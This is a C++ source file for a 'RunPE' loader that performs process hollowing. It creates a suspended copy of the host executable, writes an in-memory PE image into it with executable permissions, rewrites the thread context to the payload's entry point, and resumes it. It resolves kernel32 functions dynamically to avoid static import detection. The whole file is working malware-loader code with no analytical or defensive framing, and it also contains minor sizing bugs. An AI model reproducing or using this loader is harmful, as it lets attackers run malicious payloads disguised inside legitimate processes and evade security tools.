#include "runpe.h"

#include <stdexcept>

#define GET_FUNCTION_PTR(function) reinterpret_cast<decltype(&function)>(RpGetProcAddress("kernel32.dll", #function))

void RunPE::RunExecutable(std::vector<char>& Image, LPCSTR CmdLine) {
    PVOID image = static_cast<PVOID>(Image.data());

    PIMAGE_DOS_HEADER dosHeader = PIMAGE_DOS_HEADER{};
    PIMAGE_NT_HEADERS64 ntHeaders = PIMAGE_NT_HEADERS64{};
    PIMAGE_SECTION_HEADER SectionHeader = PIMAGE_SECTION_HEADER{};

    STARTUPINFOA startupInfo = STARTUPINFOA{};
    memset(&startupInfo, 0, sizeof(startupInfo));

    PROCESS_INFORMATION processInfo = PROCESS_INFORMATION{};
    memset(&processInfo, 0, sizeof(processInfo));

    char filePath[256];
    GET_FUNCTION_PTR(GetModuleFileNameA)(nullptr, filePath, MAX_PATH);

    dosHeader = PIMAGE_DOS_HEADER(image);
    ntHeaders = PIMAGE_NT_HEADERS64(reinterpret_cast<ULONGLONG>(image) + dosHeader->e_lfanew);

    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        throw std::runtime_error("failed to get image signature");
    }

    if (!GET_FUNCTION_PTR(CreateProcessA)(filePath, const_cast<char*>(CmdLine), 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &startupInfo, &processInfo)) {
        throw std::runtime_error("failed to create process");
    }

    PCONTEXT ctx = PCONTEXT{};
    ctx = LPCONTEXT(GET_FUNCTION_PTR(VirtualAlloc)(0, sizeof(ctx), MEM_COMMIT, PAGE_READWRITE));
    ctx->ContextFlags = CONTEXT_FULL;

    if (!GET_FUNCTION_PTR(GetThreadContext)(processInfo.hThread, LPCONTEXT(ctx))) {
        throw std::runtime_error("failed to get thread context");
    }

    LPVOID imageBase = GET_FUNCTION_PTR(VirtualAllocEx)(processInfo.hProcess, LPVOID(ntHeaders->OptionalHeader.ImageBase), ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    GET_FUNCTION_PTR(WriteProcessMemory)(processInfo.hProcess, imageBase, image, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    for (auto i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        SectionHeader = PIMAGE_SECTION_HEADER(reinterpret_cast<ULONGLONG>(image) + dosHeader->e_lfanew + 0x108 + (i * 0x28));
        GET_FUNCTION_PTR(WriteProcessMemory)(processInfo.hProcess, LPVOID(ULONGLONG(imageBase) + SectionHeader->VirtualAddress), LPVOID(ULONGLONG(image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL);
        GET_FUNCTION_PTR(WriteProcessMemory)(processInfo.hProcess, LPVOID(ctx->Rdx + 0x10), LPVOID(&ntHeaders->OptionalHeader.ImageBase), 0x8, NULL);
    }

    ctx->Rcx = reinterpret_cast<ULONGLONG>(imageBase) + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    GET_FUNCTION_PTR(SetThreadContext)(processInfo.hThread, LPCONTEXT(ctx));
    GET_FUNCTION_PTR(ResumeThread)(processInfo.hThread);
    GET_FUNCTION_PTR(WaitForSingleObject)(processInfo.hProcess, 0);
}

PVOID RunPE::RpGetProcAddress(const char* Mod, const char* Proc) {
    auto Module = GetModuleHandleA(Mod);
    if (Module) {
        return GetProcAddress(Module, Proc);
    }
    else {
        Module = LoadLibraryA(Mod);
        return Module ? GetProcAddress(Module, Proc) : nullptr;
    }
}

